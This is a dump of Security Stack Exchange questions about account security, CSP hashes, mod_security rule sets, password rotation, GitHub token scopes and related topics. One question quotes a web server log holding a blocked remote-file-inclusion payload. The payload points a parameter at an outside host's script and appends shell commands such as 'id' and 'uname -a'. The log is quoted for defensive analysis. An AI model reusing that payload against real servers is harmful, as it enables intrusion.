","98943","","","","","2017-02-21 12:05:32","Whatsapp is adding passwords: what is the threat model that they want to protect their users from?","<passwords><multi-factor><account-security><threat-modeling><whatsapp>","4","0","","","","CC BY-SA 3.0"
"220364","1","220373","","2019-10-29 08:00:55","","50","10385","<p>Does it make sense to log a user out from a web service after the user's IP address is changed?</p>

<p>I understand that a change of an IP address might indicate a man-in-the-middle attack. Then again IP addresses of end user devices (mobile phones) might change frequently when switching from network provider to local WLAN.</p>

<p>I personally think that adding a logout mechanism like this would not really add to the security of a website.</p>

<p>What aspects do I need to consider to make a solid decision about whether to use such a logout mechanism or not?</p>
","159776","","41015","","2019-10-30 16:15:39","2019-11-19 14:45:15","Log user out after change of IP address?","<web-application><account-security>","4","7","","","","CC BY-SA 4.0"
"220484","1","","","2019-10-31 01:25:41","","3","244","<p>Let's say that ACME, Inc. is making closed-source software. It's closed for a reason (they don't want it leaving their building other than in compiled form). Now, they are hiring some company/person to audit the code for them. How exactly is this done?</p>

<p>If I were ACME, Inc., I would want the audit person (or persons) to come to my physical location, get literally locked into a room with no Internet access, carefully frisked for any USB sticks or any other electronics both when they enter and leave. With cameras recording the screen and the auditor's face/hands 100% of the time he/she spends in there, which is carefully looked at by my own employees as it happens and/or afterwards.</p>

<p>However, this sounds both demeaning for the person doing the audit, and also unrealistic for anything but the biggest and richest companies. (And with a security-conscious/paranoid CEO.)</p>

<p>I cannot imagine that they just ZIP up their source code tree and e-mail it to the auditor or something similar. Even with encryption and whatnot, this just feels horribly insecure. I would feel as if the second the source code is sent to the auditor remotely, it's ""left the building"" and become ""potentially public"".</p>

<p>How is this done in practice? Do companies really trust the security of the audit companies? As I type this, I realize how silly that sounds, since they are after all paying them to find flaws in their own code, but still, something about not controlling the whole process just sounds horribly insecure.</p>

<p>I wouldn't be surprised if you answered that most companies these days just have a ""private GitHub repo"" to which they grant the auditor access in some GUI. But I would never, ever do that myself...</p>
","220819","","","","","2019-10-31 01:27:44","When a closed-source company hires somebody to audit their code, is the auditor forced to do it in the company's office?","<audit><physical><security-theater>","1","0","","","","CC BY-SA 4.0"
"220520","1","","","2019-10-31 13:20:51","","2","312","<p>I work on an application where users are sent a unique registration code in the post.  They use this, along with other personal information known to the user, to confirm the identity of the user upon creating a new account.</p>

<p>Does the unique registration code sent in the post need an expiry time (like after 30 days)?</p>

<p>The argument that has been made to me is that if there is no expiry then a fraudster has longer to collate the personal information about the intended user to confirm identity.  Therefore, they argue that adding an expiry decreases the likelyhood of fraudsters creating an account posing as the intended user.</p>

<p>However, if that's the case, I would imagine that having an expiry would make no difference.  If a fraudster has intercepted this mail then the individual has been personally targeted and the fraudster would be able to obtain the personal information to request another code?</p>
","220859","","220860","","2019-10-31 14:54:41","2023-02-15 15:06:05","Do registration codes need expiry?","<account-security><registration><expiration-date>","2","4","","","","CC BY-SA 4.0"
"151148","1","","","2017-02-12 21:24:48","","2","101","<p><em>I apologize in advanced if I am misusing vocabulary, as I'm no security expert.</em></p>

<p>If you've been compromised (mostly regarding web accounts like e-mail, FB, etc.) once, are you more likely to be compromised again?</p>

<p>I can imagine that a hacker might have constant access to some piece of a table in the database where your account info is stored. Then, even if you change your password, he will know the new one and be able to compromise your account again.</p>

<p>Is this possible?</p>
","128326","","","","","2017-02-12 21:57:54","If you've been compromised once, are you more likely to be compromised again?","<data-leakage><account-security>","1","1","","","","CC BY-SA 3.0"
"220601","1","","","2019-11-02 05:41:37","","-2","114","<p>Today someone tried to access my LinkedIn account. When I logged into my LinkedIn account, I received PIN by mail. So how can I know the location and IP address of the hacker?</p>
","220969","","6253","","2019-11-02 10:45:28","2019-11-02 10:45:28","Know location and IP address","<ip><account-security>","1","1","","2019-11-02 10:44:31","","CC BY-SA 4.0"
"84428","1","84434","","2015-03-23 18:41:01","","0","518","<p>I'm looking for practical advice on the OWASP rule set for mod_security. I've heard it has many false positives, and wondering if people have successfully applied it?</p>

<p>I can't afford the TrustWave and my first few interactions with Atomicorps GotRoot rules has not been positive so I'm exiting my options.</p>

<p>Are there any other rule set providers?</p>
","31799","","","","","2015-03-23 20:25:48","mod_security : affordable rule sets","<mod-security>","1","6","","","","CC BY-SA 3.0"
"12242","1","","","2012-02-28 19:26:36","","1","883","<p>I have the following Wireshark log and I want to categorize the attack. I think it prints the user under apache runs and then prints the system information. From this log can we determine if the attack was successful? In my opinion it was not because of the apache's <code>mod-security</code>. </p>

<pre><code>Request: 200.158.8.207-- [19/Jan/2012:19:40:46 --0400] ""POST /index.php HTTP/1.1"" 403 743
Handler: cgi-script
POST lindex.php HTTP/1.1
Host: www.foo.com
Connection: keep-alive
Accept: '/'
Accept-Language: en-us
Content-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla 4.0 (Linux)
Content-Length: 65
X-Forwarded-For: 200.158.8.207
mod_security-message: Access denied with code 403. Pattern match ""unamelx20-a"" at
POST_PAYLOAD
mod_security-action: 403

65
lid=http://th3.ownz. p5. org. uk/lila.jpg?&amp;cmd=cd /Imp; id; lsuname -a
</code></pre>
","8111","","76718","","2018-05-07 11:51:26","2018-05-07 11:51:26","Wireshark log analyzing","<web-application><web-browser><logging><mod-security>","1","0","","","","CC BY-SA 4.0"
"220734","1","","","2019-11-05 14:30:06","","1","112","<p>I know reading that title probably made some of you gag, but let me explain the situation. I was tasked with creating a pretty straightforward storefront web app (php/laravel/stripe for payments) which I have done several times in the past, no big deal. However my past applications all required the user to create an account at checkout so we could handle any refund requests that that customer might have.</p>

<p>Jump forward to my current project, the business customer is adamant about NOT requiring a user account for customers to complete checkout. Ok, I thought...that shouldn't be an issue...except for refunds...how will we handle refunds? Well my solution is currently (and this is still in development it's not in production use until I verify that I'm not completely crazy for doing this) to provide the user a hyperlink within the email they receive at checkout confirmation such as <code>https://ourdomain.com/refund/9d5f131a-f050-4491-8a30-f6c610deab62</code> with the uuid being a secret key to the line item record the user wishes to refund. When they click this link, they then have access to request a refund for the item.</p>

<p>Part of me feels like this is fine as this is basically how password resets work (user gets url sent to their email with token they then use to change their password), and I have seen this done in other places (although only for displaying data related to a transaction and not allowing an action). However another part of me is torn as it just doesn't feel right to me to allow ""authorization"" via a url.</p>

<p>Can anyone confirm whether or not this would be acceptable practice within a production environment?</p>

<p><strong>EDIT</strong></p>

<p>There is a timelimit on when a refund can no longer be issued (however it could be several months into the future). The goods sold are currently digital only and are sent to the user upon checkout. Once refunded, the copies sent to the user are invalidated. The only real harm that could be done if this is misused is that someone who obtained the link which should not have it could issue a refund of the item unbeknownst to the purchaser, causing the purchaser's item to become invalidated. At which point they would receive their purchase price at the expense of frustration when their item does not work.</p>
","82638","","82638","","2019-11-05 15:10:10","2019-11-05 15:10:10","Using uuidv4 in url to allow non registered users to refund purchases","<web-application><account-security>","0","6","","","","CC BY-SA 4.0"
"220737","1","","","2019-11-05 16:10:13","","2","360","<p>Many services integrate with github. Some of them seem to require a personal access token with ""repo"" permission. Personal access tokens are global across all projects. In other words you may want to use some external service to access just one project but by giving that service a personal access token you've giving it access to all projects. Further, a personal access token with the ""repo"" permission give access to basically do anything with the repo. Add commits, remove commits, send releases, etc.</p>

<p>Similarly some services ask you to authorize via Oauth to allow them to do anything and everything with your github account.</p>

<p>This seems to me like a security nightmare similar to Facebook asking for the username/password for your email but actually much much worse because not only can some company with a github personal access token or OAuth write permmission do someting nasty to your repo but via your repo, if that repo is popular, they can do something nasty to everyone using your repo.</p>

<p>As one example I saw <a href=""https://github.com/Stuk/jszip"" rel=""nofollow noreferrer"">this popular open source project (jszip)</a> which is using <a href=""https://codeclimate.com/"" rel=""nofollow noreferrer"">this service (codeclimate)</a> to rate their code coverage. I thought I might add it to my open source projects so I go to <a href=""https://codeclimate.com/oss/"" rel=""nofollow noreferrer"">their open source page</a> and click to sign up with github. That leads me it asking for these permissions</p>

<p><a href=""https://i.stack.imgur.com/INu5w.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/INu5w.png"" alt=""enter image description here""></a></p>

<p>Given them write permissions seems like a huge security issue. <a href=""https://www.npmjs.com/package/jszip"" rel=""nofollow noreferrer"">That repo gets 2 millon downloads a week</a>. At any time codeclimate or any disgruntaled employee could push a change to that repo that compromises some percertage of all the people downloading that repo.</p>

<p>Similarly <a href=""https://www.electron.build/"" rel=""nofollow noreferrer"">electron-builder</a> can be setup to put files in your releases but to do so it <a href=""https://www.electron.build/configuration/publish#githuboptions"" rel=""nofollow noreferrer"">asks for a personal access token to your entire github</a> all repos. This means they could easily push an update that pushes malware to all your repos (as opposed to just one repo).</p>

<p>Github has something called a <a href=""https://developer.github.com/v3/guides/managing-deploy-keys/#deploy-keys"" rel=""nofollow noreferrer"">deploy_key</a> that is per repo but electron builder is not using that. Further, in their instructions on getting your 3rd party continous integration (CI) service to build for you and put the result in your releases they basically tell you to add your personal access token into the CI. That seems about as smart as giving some random stranger the keys to your house and withdrawl permission from your bank accounts.</p>

<p>It would seem like services like codeclimate should only need read permissions and would be shamed out of existance for asking for blanket write permission. For electron-builder similarly, designing such that it needs blanket permission across all repos seems also like very irresponsible design.</p>

<p>How is this not more of a concern? Developers are supposed to be more aware than the average user of security issues. Am I over reacting? Is this just something that's not a concern? I'm somewhat astonished that github doesn't have finer grained controls. For example for electron-builder, the only permission I need so to be able to allow the app to add files to a release. I'd prefer not to give it permission to do anything else like making commits or generating issues etc but given that Github doesn't even offer this more selective option I must be missing how this is super safe as is.</p>

<p>What I would expect is giant warnings for all of these features. That the norm would be the smallest permissions possible. Instead I seem to find the opposite which is the default being too many permissions, write access to all repos.</p>

<p>Am I worried about nothing?</p>

<hr>

<p>Let my try to make my question clearer. My question isn't so much about my personal projects. My question is rather why isn't this a bigger topic. It seems like people should be screaming the software world is on fire and yet I've never heard anyone remotely concerned. </p>

<p>So I'm asking why isn't this ""the software world is on fire and we're all going to die"" situation. Why are there's not 100s or 1000s of articles screaming to all devs this is bad the same way <a href=""https://www.google.com/search?q=don%27t+share+your+email+password"" rel=""nofollow noreferrer"">sharing your email password is bad</a>, worse actually since your email security affects only you where as your OSS repo affects potential millions of people. I can't find a single article on this topic.</p>

<p>Why aren't there articles by famous devs, the EFF, Mozilla, Google, whoever calling out bad practices and shaming devs that have given up the keys to their repos?</p>

<p>What am missing? Is this really not a worry? Am I over reacting?</p>
","29114","","29114","","2019-11-06 02:56:19","2019-11-06 02:56:19","How are github personal access tokens and other github auth for 3rd parties not a securty issue?","<account-security><authorization><github>","0","7","","","","CC BY-SA 4.0"
"151553","1","","","2017-02-17 11:20:12","","3","1227","<p>I was just asked to allow a partners users to authenticate to our backoffice just by clicking a link in their backoffice. The only common data we have is these users mail.</p>

<p>I fail to see how I can securely implement this. Any insights?</p>

<hr>

<p>It seems OAuth2 is the way to go. After a bit reading I suppose the flow must be like</p>

<ol>
<li>give partner's backoffice an access token through <a href=""https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2#grant-type-client-credentials"" rel=""nofollow noreferrer"">client credentials grant</a></li>
<li>make them use this token by calling an endpoint which will return a link given the user's mail as parameter</li>
</ol>

<p>The link will contain a usage-unique token which will be used to authenticate the user.</p>

<p>Given all calls use HTTPS I think this would be secure?</p>
","139640","","139640","","2017-02-20 08:36:41","2017-02-20 20:34:00","Authenticate user just by clicking a link on external website","<authentication><account-security>","2","2","","","","CC BY-SA 3.0"
"151683","1","154398","","2017-02-19 04:33:38","","1","870","<p>I use the following CSP rule:</p>

<pre><code>Content-Security-Policy: require-sri-for script style
</code></pre>

<p>I know that if I load style and script from a CDN it will get blocked if I don't include their hash.</p>

<p>But if I serve my script and style from my own domain, will it remain accessible? (CORS is disabled)</p>

<hr>

<p>I ask this because a site visitor send this to me: </p>

<pre><code>2017-02-18 21:52:14.622 example.com/:1 Refused to load the stylesheet 'https://example.com/assets/css/main.css' because 'require-sri-for' directive requires integrity attribute be present for all stylesheets.
2017-02-18 21:52:14.632 example.com/:1 Refused to load the script 'https://example.com/assets/js/main.min.js' because 'require-sri-for' directive requires integrity attribute be present for all scripts.
2017-02-18 21:52:14.633 example.com/:1 Refused to load the script 'https://example.com/assets/js/katex.min.js' because 'require-sri-for' directive requires integrity attribute be present for all scripts.
2017-02-18 21:52:14.633 example.com/:1 Refused to load the script 'https://example.com/assets/js/section.min.js' because 'require-sri-for' directive requires integrity attribute be present for all scripts.
2017-02-18 21:52:14.633 example.com/:1 Refused to load the script 'https://example.com/assets/js/canvas.js' because 'require-sri-for' directive requires integrity attribute be present for all scripts.
2017-02-18 22:01:13.667 example.com/:1 Refused to load the stylesheet 'https://example.com/assets/css/main.css' because 'require-sri-for' directive requires integrity attribute be present for all stylesheets.
</code></pre>

<p>This doesn't sound normal and I couldn't reproduce it on any device.</p>

<hr>

<p><strong>Edit</strong></p>

<p>I found out that it is possible to add a SRI hash to the style and script, but the question remains, is it necessary to do so?</p>
","139796","","139796","","2017-03-20 14:39:52","2017-09-16 19:50:12","If I use the require-sri-for CSP, will script and style loaded from my site remain accessible?","<content-security-policy>","1","0","","","","CC BY-SA 3.0"
"151739","1","","","2017-02-19 22:46:27","","1","515","<p>This evening I received an email from Microsoft saying my account had been compromised.</p>

<p>I changed the password and looked at the activity log. This is what I saw three days ago on the 16th of Feburary</p>

<blockquote>
  <p>Protocol: IMAP  IP: 111.110.153.191  Account alias:  email address 
  Time:2/16/2017 8:37 AM  Approximate location: Japan  Type: Successful
  sync Blockquote</p>
</blockquote>

<p>I've changed all passwords and created a new email address for some websites which used the compromised Hotmail address.</p>

<p>I'm pretty worried if I'm honest. This address was hooked up to Amazon, Steam, eBay (not PayPal) and pretty much everywhere. What kind of damage am I looking at?</p>

<p>I've contacted Microsoft who of course were no help what so ever.</p>
","139856","","","","","2017-02-20 09:52:35","Hotmail address compromised?","<email><account-security>","2","1","","2017-02-21 20:25:57","","CC BY-SA 3.0"
"220875","1","220876","","2019-11-08 11:26:03","","0","242","<p>I have done the first development of a website and deployment. Scanning the server with an online security evaluation tool I was recommended that I add a Content security Policy to the website, and I understand that this can help with XSS. But I read that this will disable inline CSS styles.</p>

<p>I have used inline CSS freely all over the website. Did not know this was a bad thing. (eg: div style=""width:100%;""). If I was to find and transfer all inline CSS to file it would take too long.</p>

<p>However I am only taking input from user in 3 pages. One is a feedback form that stores data on server only. One is a contact form that does not store data only send an email(collects user email address). The comments page takes comment input, stores the data, it retrieves and displays entries that have been cleared by admin. The other pages are mostly displaying static content.</p>

<p>I'm assuming comments page is the priority (is this right?). Would it work if I put CSP declarations (? default-src: https:) to the above three pages only (and remove inline CSS). and the others have inline enabled (? default-src: https: 'unsafe-inline') ?</p>
","221283","","","user163495","2019-11-08 11:37:04","2019-11-08 11:37:04","XSS and Content Security Policy, and existing CSS","<xss><content-security-policy><css>","1","0","","","","CC BY-SA 4.0"
"220886","1","","","2019-11-08 14:28:57","","1","96","<p>I am trying to evaluate how safe personal accounts are (including my own).<br>
Are there any statistics on the top security flaws which cause accounts to be compromised/stolen?<br>
Like: 25% of cases is common password, 13% of cases is malware accessing passwords in browsers, 10% is password interception on an unsecure channel etc.  </p>

<p>I know what I have to do in order to make an account fully secure (end-to-end cryptography using a physical key for both authentication and data), but there is a balance between risk and cost of counter-measures (especially considering the low number of online services offering end-to-end encryption).  </p>
","198041","","","","","2019-11-08 14:28:57","Are there any statistics about most common account thefts?","<account-security>","0","6","","","","CC BY-SA 4.0"
"221177","1","","","2019-11-13 15:42:16","","0","128","<p>I have a web based application form that is used to gather personal information for web based users. One of the fields is an SSN. My question is simple, in terms of security compliance (in general, OWASP, PCI, SOC2, etc), is it okay to prefill the SSN when the user is returned to the form because of validation issues? </p>

<p>For instance, say I fill out the entire form, I forgot to enter Birth Date (another field on the form), the form reload the page, displays a validation message related to a required field birth date, the form is then populated with the form fields the user already entered, First Name, Last Name, SSN, etc. Is it acceptable in terms of security compliance to repopulate their SSN (this is coming from the server side validation, not client side), or should I force the user to re-enter their SSN? </p>
","167403","","","","","2019-11-13 15:42:16","Returning Social Security Number After Validation Checks on Web Based Form","<web-application><webserver><compliance><owasp><social-security-number>","0","4","","","","CC BY-SA 4.0"
"151968","1","151970","","2017-02-22 00:26:02","","1","152","<blockquote>
  <p>Layered security, also known as layered defense, describes the
  practice of combining multiple mitigating security controls to protect
  resources and data.</p>
</blockquote>

<p>How to convince someone to use <a href=""https://en.m.wikipedia.org/wiki/Layered_security"" rel=""nofollow noreferrer"">layered security</a>? While rejecting counterarguments like: ""</p>

<ol>
<li><em>We already have a rock-solid firewall...</em></li>
<li><em>He always installs all security updates...</em></li>
<li><em>I use HTTPS on all my pages...</em></li>
</ol>

<p><em>... that should be enough!""</em></p>
","72031","","72031","","2017-03-01 21:42:15","2017-03-01 21:42:15","How to convince someone to use layered security?","<defense><security-by-design>","1","0","","","","CC BY-SA 3.0"
"221235","1","221242","","2019-11-14 17:47:42","","8","2518","<p>I have an img tag on a page with an line style that looks like this:</p>

<pre><code>style=""height:50px;width:180px;display:block;""
</code></pre>

<p>I can't move it to an external stylesheet because the img tag is generated by a 3rd party control. So I copied the hash displayed in Chrome developer tools.</p>

<p>Part of the Content-Security-Policy looks like this:</p>

<pre><code>style-src 'self' 'sha256-7kYG54iPGE/Vf+GFqobEwpF9bfCAVA/elCz7OiSmMl0=';
</code></pre>

<p>But Chrome still blocks it with the following message:</p>

<pre><code>Refused to apply inline style because it violates the following Content Security Policy directive: ""style-src 'self' 'sha256-7kYG54iPGE/Vf+GFqobEwpF9bfCAVA/elCz7OiSmMl0='"". Either the 'unsafe-inline' keyword, a hash ('sha256-7kYG54iPGE/Vf+GFqobEwpF9bfCAVA/elCz7OiSmMl0='), or a nonce ('nonce-...') is required to enable inline execution.
</code></pre>

<p>The hash in the policy matches the required hash in the error message. Why is Chrome still blocking it? </p>

<p>Thanks...</p>
","221662","","","","","2019-11-14 20:53:46","Content Security Policy Style Hash","<content-security-policy>","1","1","0","","","CC BY-SA 4.0"
"221305","1","","","2019-11-15 22:06:57","","1","132","<p>I am planning to track the Network calls being made by apps and the website of an Android Device.</p>

<p>I have used the Burp Suite tool for tracking the network calls.
Until now the Android Device and the Laptop were connected to the same WIFI.</p>

<p>But now I am planning to use an emulator which will not be hosted in my Laptop.</p>

<p>Is there any way to track network calls of an Android Device which is not connected to the same WIFI as my laptop?</p>
","221352","","19891","","2019-11-15 22:43:22","2019-11-15 22:43:22","Track HTTP(S) Network calls being made by an Android Device","<android><man-in-the-middle><account-security><wireshark><burp-suite>","0","10","","","","CC BY-SA 4.0"
"152082","1","152089","","2017-02-23 02:49:24","","0","552","<p>I would like to code the following :</p>

<p>In a windows server 2012-R2 administrator account, I have a my java application which launches an external application to run in a restricted user account. My java application also changes the user account windows permissions (read/write) as required.</p>

<p>1- Is it possible to launch an external application from a java processBuilder in one account and run the application in a different windows account?</p>

<p>2- Is it possible to change a windows server 2012-R2 users permission from java? only through a PS script?</p>

<p>Thanks</p>
","140167","","","","","2017-02-23 04:17:10","change read/write user permissions in windows server 2012 from java code","<java><account-security><windows-server>","1","0","","","","CC BY-SA 3.0"
"221364","1","","","2019-11-17 01:30:51","","1","204","<p>It is a fact that antivirus software can't detect all the spyware/viruses/malware that exist. And when they get detected, new ones are created.</p>

<p>An example is the pegasus spyware for ios created by the NSO group. There is also an android version available. And there are many spyware for windows computers which claim to be undetectable. And there are probably many more for different OS that are not made public. </p>

<p>So what can you do about a possible spyware on your device that your antivirus/antispyware doesn't detect? </p>
","209619","","209619","","2019-11-17 12:05:59","2019-11-17 12:05:59","How can you stay safe from spyware used by governments?","<antivirus><spyware><government><security-by-design>","0","12","","2019-11-18 06:25:36","","CC BY-SA 4.0"
"221470","1","222901","","2019-11-19 04:51:22","","1","356","<p>Ubuntu 18.04<br>
Apache/2.4.29<br>
ModSecurity for Apache/2.9.2 (<a href=""http://www.modsecurity.org/"" rel=""nofollow noreferrer"">http://www.modsecurity.org/</a>); OWASP_CRS/3.0.0<br>
modsecurity-crs 3.0.2-1</p>

<p>This is a new server.  The following message appears in <code>modsec_audit.log</code> in every entry:</p>

<pre><code>--c2d2e910-H--
Message: Warning. Operator EQ matched 0 at TX. [file 
""/usr/share/modsecurity-crs/rules/REQUEST-901-INITIALIZATION.conf""] 
[line ""56""] [id ""901001""] [msg ""ModSecurity Core Rules setup file has 
not been detected. Threat detection and blocking may be nonfunctional. 
Please ensure to make a copy of the setup template crs- 
setup.conf.example, and include your crs-setup.conf file in your 
webserver configuration before including the CRS rules.""] [severity 
""WARNING""]
</code></pre>

<p>&nbsp;</p>

<pre><code>me@www:~$ apache2ctl -t -D DUMP_MODULES |grep security2_module
 security2_module (shared)
</code></pre>

<p>As shown above, the module is loaded.  My Apache conf has an <code>&lt;IfModule security2_module&gt;</code> stanza that includes:</p>

<pre><code>IncludeOptional /usr/share/modsecurity-crs/owasp-crs.load
</code></pre>

<p>The file <code>owasp-crs.load</code> has:</p>

<pre><code>Include /etc/modsecurity/crs/crs-setup.conf
IncludeOptional /etc/modsecurity/crs/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf
Include /usr/share/modsecurity-crs/rules/*.conf
IncludeOptional /etc/modsecurity/crs/RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf
</code></pre>

<p>&nbsp;</p>

<pre><code>me@www:~$ ls /etc/modsecurity/crs/crs-setup.conf
/etc/modsecurity/crs/crs-setup.conf
</code></pre>

<p>As the warning states, <code>crs-setup.conf</code> can't be found though the file exists in the specified location.  However, the system seems to be working properly.  For example, in <code>crs-setup.conf</code> if I remove all HTTP methods from ID <code>900200</code> then I get a HTTP 403 Forbidden which is expected based on how I have the system configured.</p>

<p>Your thoughts and experience are appreciated in helping to resolve this.</p>

<p>Thank you.</p>
","39674","","","","","2019-12-18 00:27:58","Modsecurity - OWASP CRS 901001","<apache><owasp><mod-security>","1","2","","","","CC BY-SA 4.0"
"152175","1","","","2017-02-23 17:34:51","","1","297","<p>Is there any guidance stating that the best way to handle leavers is to disable accounts (at least initially) instead of changing passwords? Given that AD supports this option I would assume this is the only supported way to disable a user, but other hacks seem to be prevalent to support legacy apps or processes.</p>

<p>I ask because I believe this is the only secure way, but many guides and companies tend to follow an approach which changes the password for the user to something they don't know. I think other methods such as moving an account to an OU which cannot log in are even more flawed.</p>

<p>Historically this might have been a good practice when all applications where on-premises, but with cloud applications using many sync tools it seems like an AD account being disabled is the only safe indicator for upstream applications.</p>

<p>It seems like some applications like the latest versions of Outlook with O365 support invalidation of credentials with ADAL following a password reset, but I doubt this is universal. </p>
","4901","","","","","2017-02-23 21:09:40","Policy implications of changing passwords versus disabling accounts in Active Directory","<active-directory><account-security><account-lockout>","2","0","","","","CC BY-SA 3.0"
"152240","1","","","2017-02-24 08:15:05","","3","1073","<p>I got an email from my network admin suggesting that one of my connected devices might be infected.</p>

<p>Additional information to this case:<br>
Malwaretype: TROJAN Self-Signed Cert Observed in Various Zbot Strains  </p>

<p>What action should I take to protect myself, and how can I ensure that none of my private information was stolen?</p>
","139716","","139716","","2017-02-24 08:50:38","2017-03-26 12:40:48","What action can I take to protect against TROJAN Self-Signed Cert","<malware><account-security>","1","0","","","","CC BY-SA 3.0"
"85381","1","85382","","2015-04-07 00:50:51","","3","3278","<p>Quite a few websites, <a href=""http://coinbase.com"" rel=""nofollow"">Coinbase</a> and <a href=""http://stripe.com"" rel=""nofollow"">Stripe</a> most notably, ask for the last four digits of your social security number to 'verify your identity'.  Assuming these websites are not trying to fraud you, how could knowing four digits of your SSN possibly be valuable to them?  Both of these websites (if you have made a transaction) have access to your bank account, so does that have anything to do with it?</p>
","68560","","98538","","2018-12-14 09:13:56","2018-12-14 09:13:56","Why do websites ask for the last four digits of your social security number?","<identity><banks><identification><social-security-number>","1","0","","","","CC BY-SA 3.0"
"221539","1","","","2019-11-20 03:59:02","","2","1025","<p>In the course of my computer working I daily use dozens of username/passphrase pairs. Within the limits of my understanding and restrictions I apply the best practices for security. Unfortunately I have limitations on my abilities to employ some measures. I am often using the Internet in high-risk situations, such as on a public computer, or some other device not under my control, and using open public WiFi networks.</p>

<p>Some of the measures I employ are:</p>

<ul>
<li>Never use the same passphrase for two purposes</li>
<li>Never reuse a passphrase, or minor modifications of prior passphrases</li>
<li>Personal minimum of 14 characters, unless the environment restricts it to less</li>
<li>Limit characters to 7-bit ASCII printable (guaranteed to be typeable anywhere)</li>
<li>Include all four complexity groups (upper/lower alpha, numeric, punctuation/special)</li>
<li>Don't use words, even converted with character substitutions, i.e.: password as p4s5w0rd</li>
<li>Passphrases have no reference to the username or their purpose</li>
<li>Security questions, or reset questions, have fake answers (treated like a second passphrase)</li>
<li>Don't use any information which relates to me, my life, or my past, as material for passphrases</li>
<li>PGP keys are created, or renewed, on an air-gaped box, and the primary private key never leaves there</li>
<li>Exported PGP keys have their passphrase changed before exporting</li>
<li>PGP keys have a short life, expiry dates typically in a six month window</li>
<li>Most importantly, nothing I create, including hints, is written/saved anywhere except in my cranium</li>
<li>System generated recovery phrases (such as for crypto wallets) are saved in encrypted storage only</li>
</ul>

<p>Some of my limitations are:</p>

<ul>
<li>Unreliable access to SMS</li>
<li>Lack of ability to install authenticator apps</li>
<li>Inability to rely on password keepers</li>
</ul>

<p>My limitations, and exposures, are non-negotiable. I'm well aware of the arguments for (and against) password keepers, 2FA, physical keys, etc., and they are not germane here as they simply are not available as a solution for me.</p>

<p>I am also aware of the argument against a policy of password rotation forced on users by the system, or management. The chief point being that employee John Q. Public might pick a good passphrase originally, but then change it each time it is required by adding on a rotating, or incrementing, part. Thus, <code>SuperDuperSecret</code> becomes <code>SuperDuperSecret2018</code>, <code>SuperDuperSecret2019</code>, <code>SuperDuperSecret2020</code> ..., or <code>MyGoodPhrase</code> becomes the rotating set of <code>MyGoodPhraseMar</code>, <code>MyGoodPhraseJun</code>, <code>MyGoodPhraseSep</code>, <code>MyGoodPhraseDec</code>. In my case the argument is spurious as it is not a policy I'm required to follow, but one I'm choosing to apply; and the simple modifications that it commonly triggers in users does not applied in my case, as I know, and want, better.</p>

<p>The question I am asking is not <em>What measures can I employ for security?</em> The question is should I continue to do password rotation at all, and how often should I rotate my passwords? The <em>how often</em> presumes medium sensitivity with reduced frequency for low-risk or lower sensitivity (account on PcPartsPicker, for example), and increased frequency for high-risk or highly sensitive accounts (my bank account, for example). A suspected compromise, of course, has a frequency of <strong>now</strong>, as soon as the breach is reported, or suspected.</p>

<p>This is not a trivial concern either, as the last time I did a reset across the board, online and local passphrases, it was a three-day long event. </p>

<p>This also could affect how I apply requirements on passwords for users on systems and sites I maintain, and client access to services.</p>
","","user135823","","","","2019-11-20 12:07:09","How often, if at all, should I rotate my passwords?","<password-policy><account-security><defense>","2","2","","","","CC BY-SA 4.0"
"152252","1","152254","","2017-02-24 10:08:51","","88","17798","<p>Yesterday evening my android phone (Google Play Services app) asked me to log in again into my account due to ""security changes"" (I don't remember the exact wording used).</p>

<p>I double checked it was the real app and logged in again (I went through all the authentication steps, including 2FA through SMS that was automatically picked up by the app).</p>

<p>I then checked all my account activities and security settings, and found there were no signs of access or edits other than my own. Everything looked perfectly fine, including linked devices and apps.</p>

<p>Should I worry, or is this a random check by Google to see if my access from the phone is still valid? (Or maybe Google Play Services just lost an auth token and asked me to log in again?)</p>

<hr>

<p>Example of sign-in request:</p>

<p><a href=""https://i.stack.imgur.com/W29Ph.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/W29Ph.png"" alt=""enter image description here""></a></p>
","80617","","7475","","2017-02-25 00:14:41","2017-11-18 02:19:34","Google account verification request","<android><google><account-security>","3","12","","","","CC BY-SA 3.0"
"152281","1","","","2017-02-24 15:04:25","","1","557","<p>Well the title says it all really. Obviously if they return it's easy to enable but I'm talking specifically about leavers where there is no intention of returning. </p>

<p>Many places simply disable accounts rather than delete them. Is there a security reason for this? I'm not sure I see any risks with disabling the account rather than deleting it.</p>
","49043","","","","","2017-02-24 16:55:06","Is there a security reason to disable a leavers account instead of deleting it?","<access-control><active-directory><account-security>","2","1","","2017-02-24 21:19:59","","CC BY-SA 3.0"
"221658","1","","","2019-11-21 21:08:05","","13","736","<p>I run a localhost-only webserver (PHP's built-in one) for all my admin panels and whatnot on my machine. I'm worried that, if any random webpage has a JavaScript snippet which makes an Ajax call to <a href=""http://127.0.0.1/private.txt"" rel=""noreferrer"">http://127.0.0.1/private.txt</a> , and I visit that webpage, it will make my browser (Firefox) fetch whatever data is returned from that URL and be able to use it, for example to send it back to their own server in another Ajax request.</p>

<p>Let's assume that <a href=""http://127.0.0.1/private.txt"" rel=""noreferrer"">http://127.0.0.1/private.txt</a> returns my entire diary since 1958. Or anything equally sensitive. I definitely don't ever want it to interact with anything other than my Firefox browser, but from what I can reckon, this could be a massive privacy/security issue. I hope I'm wrong about my assumption that this request would be allowed. I hope that it has some kind of ""cross-domain policy"" blocking it or something. Especially since it's from 127.0.0.1, which should be some kind of special case.</p>

<p>What would stop it from doing this? What am I missing in my reasoning?</p>
","222087","","","","","2019-11-23 11:27:41","What would happen if some random webpage made an Ajax request for http://127.0.0.1/private.txt?","<privacy><http><firefox><security-theater>","1","1","","","","CC BY-SA 4.0"
"221708","1","221710","","2019-11-22 23:14:36","","0","646","<p>It's my first time building and deploying a REST API with just the standard library. Are there any gotchas I should keep an eye out for regarding securing my REST API?</p>
","190197","","","","","2019-11-22 23:44:07","Golang REST API: Security checks?","<web-application><account-security><rest>","1","1","","2019-11-23 00:57:39","","CC BY-SA 4.0"
"13180","1","","","2012-03-28 14:50:18","","0","911","<p>Mod_security has a rules updater distributed with their release packages on sourceforge:</p>

<p><a href=""http://sourceforge.net/projects/mod-security/files/modsecurity-crs/0-CURRENT/"" rel=""nofollow"">http://sourceforge.net/projects/mod-security/files/modsecurity-crs/0-CURRENT/</a></p>

